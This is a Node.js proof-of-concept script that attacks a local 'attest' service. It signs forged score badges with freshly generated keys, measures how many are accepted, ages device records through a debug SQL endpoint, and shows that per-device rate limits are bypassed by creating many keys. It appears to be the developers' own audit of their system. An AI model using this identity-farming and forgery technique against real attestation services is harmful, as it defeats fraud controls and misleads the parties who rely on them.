// Cheapest attack against the attest contract as built: no browser, no typing,
// no engine. Generate a key, sign a badge that CLAIMS a score, POST it.
// Measures: acceptance, throughput (identities/sec on one core), and what a
// forged score becomes once the device record is 31 / 91 / 181 days old.
const ROOT = require('path').resolve(__dirname, '..', '..');
const { webcrypto } = require('crypto');
const { performance } = require('perf_hooks');
const fs = require('fs');
const BASE = process.env.BASE || 'http://127.0.0.1:54331';
const N = Number(process.env.N || 200);

const cryptoUtilsSrc = fs.readFileSync(ROOT + '/extension/src/crypto-utils.js', 'utf8');
const CryptoUtils = new Function('chrome', 'window', cryptoUtilsSrc + '\nreturn CryptoUtils;')({}, {});
const canon = (o) => CryptoUtils.canonicalJson(o);
const hex = (buf) => Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');

async function identity() {
  const kp = await webcrypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify']);
  const jwk = await webcrypto.subtle.exportKey('jwk', kp.publicKey);
  return { priv: kp.privateKey, pub: { kty: jwk.kty, crv: jwk.crv, x: jwk.x, y: jwk.y } };
}
async function forgedBadge(id, war) {
  const text_hash = hex(await webcrypto.subtle.digest('SHA-256', new TextEncoder().encode('fake post ' + Math.random())));
  const badge = {
    version: '3.0', keys: 300, war, war_uncapped: war, tier: 'Hall of Fame', classification: 'verified',
    text_hash, url: 'https://target.example/post', minted_at: new Date().toISOString(), publicKeyJwk: id.pub,
    // no war_flags: the server takes the client's flags, so a forger sends none
  };
  const sig = await webcrypto.subtle.sign({ name: 'ECDSA', hash: { name: 'SHA-256' } }, id.priv, new TextEncoder().encode(canon(badge)));
  return { site_key: 'wgh', badge, signature: Buffer.from(sig).toString('base64') };
}
async function attest(body) {
  const r = await fetch(BASE + '/functions/v1/attest', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
  return { status: r.status, data: await r.json() };
}
const sql = async (q) => (await fetch(BASE + '/__sql?q=' + encodeURIComponent(q))).json();

(async () => {
  // 1. N fresh identities, one forged attestation each, sequential on one core.
  const t0 = performance.now();
  let accepted = 0, classes = {};
  const ids = [];
  for (let i = 0; i < N; i++) {
    const id = await identity();
    const { status, data } = await attest(await forgedBadge(id, 0.95));
    if (status === 200) { accepted++; classes[data.attestation.classification] = (classes[data.attestation.classification] || 0) + 1; }
    else classes['HTTP ' + status + ' ' + (data.error || '')] = (classes['HTTP ' + status + ' ' + (data.error || '')] || 0) + 1;
    ids.push(id);
  }
  const secs = (performance.now() - t0) / 1000;
  console.log(`day 0: ${accepted}/${N} forged attestations accepted in ${secs.toFixed(1)}s (${(N / secs).toFixed(0)} identities/s, one process, includes server + DB) ->`, classes);

  // 2. Pre-aging: the same keys once the server's own record says they are older.
  const dev0 = await CryptoUtils.deviceIdFromJwk(ids[0].pub);
  for (const days of [8, 31, 91, 181]) {
    await sql(`update devices set first_seen = now() - interval '${days} days' where device_id = '${dev0}'`);
    const { data } = await attest(await forgedBadge(ids[0], 0.95));
    console.log(`day ${days}: forged 0.95 -> war ${data.attestation.war}, cap ${data.attestation.time_cap}, classification "${data.attestation.classification}", profile level ${data.profile && data.profile.level}`);
  }

  // 3. What the public verify endpoint shows a relying party for that badge.
  const { data: last } = await attest(await forgedBadge(ids[0], 0.95));
  const v = await (await fetch(`${BASE}/functions/v1/verify?hash=${last.badge_hash}&format=json`)).json();
  console.log('public /verify for the forged badge:', JSON.stringify({ classification: v.attestation && v.attestation.classification, war: v.attestation && v.attestation.war, age_days: v.attestation && v.attestation.age_days, server_signed: !!v.server_signature }));

  // 4. Rate limit is per device: N devices -> N*60/hour. Show 65 attests on one key vs 65 keys.
  let oneKeyOk = 0, manyKeysOk = 0;
  const one = await identity();
  for (let i = 0; i < 65; i++) { const { status } = await attest(await forgedBadge(one, 0.9)); if (status === 200) oneKeyOk++; }
  for (let i = 0; i < 65; i++) { const { status } = await attest(await forgedBadge(await identity(), 0.9)); if (status === 200) manyKeysOk++; }
  console.log(`rate limit: 65 attests on one key -> ${oneKeyOk} accepted; 65 attests on 65 keys -> ${manyKeysOk} accepted`);

  // 5. Key material per identity (what a farm has to store to keep an identity for months).
  const pkcs8 = await webcrypto.subtle.exportKey('pkcs8', ids[0].priv);
  console.log(`storage per identity: ${pkcs8.byteLength} bytes of private key (+ nothing else)`);
})().catch(e => { console.error('FATAL', e); process.exit(1); });
